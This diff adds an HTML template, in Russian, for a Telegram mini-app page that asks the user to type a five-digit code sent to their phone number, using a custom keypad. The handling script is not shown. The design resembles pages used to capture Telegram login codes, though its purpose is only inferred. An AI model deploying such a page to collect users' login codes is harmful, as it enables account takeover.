@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Подтверждение входа</title>
+    <link rel="stylesheet" href="/templates/css/style.css">
+</head>
+
+<body>
+    <h1 id="app-title">Введите код</h1>
+    <div id="description">
+        Код отправлен на номер <span id="phone-number">{{phone_number}}</span>
+    </div>
+
+    <div class="code-inputs">
+        <input type="text" maxlength="1" class="code-input" readonly onfocus="handleFocus(this)">
+        <input type="text" maxlength="1" class="code-input" readonly onfocus="handleFocus(this)">
+        <input type="text" maxlength="1" class="code-input" readonly onfocus="handleFocus(this)">
+        <input type="text" maxlength="1" class="code-input" readonly onfocus="handleFocus(this)">
+        <input type="text" maxlength="1" class="code-input" readonly onfocus="handleFocus(this)">
+    </div>
+
+    <div class="error-message" id="error-message">Неверный код!</div>
+
+    <div class="keyboard">
+        <button onclick="addDigit('1')">1</button>
+        <button onclick="addDigit('2')">2</button>
+        <button onclick="addDigit('3')">3</button>
+        <button onclick="addDigit('4')">4</button>
+        <button onclick="addDigit('5')">5</button>
+        <button onclick="addDigit('6')">6</button>
+        <button onclick="addDigit('7')">7</button>
+        <button onclick="addDigit('8')">8</button>
+        <button onclick="addDigit('9')">9</button>
+        <button class="delete" onclick="deleteDigit()">⌫</button>
+        <button onclick="addDigit('0')">0</button>
+    </div>
+
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script src="/templates/js/enter_code_page.js"></script>
+</body>
+
+</html>
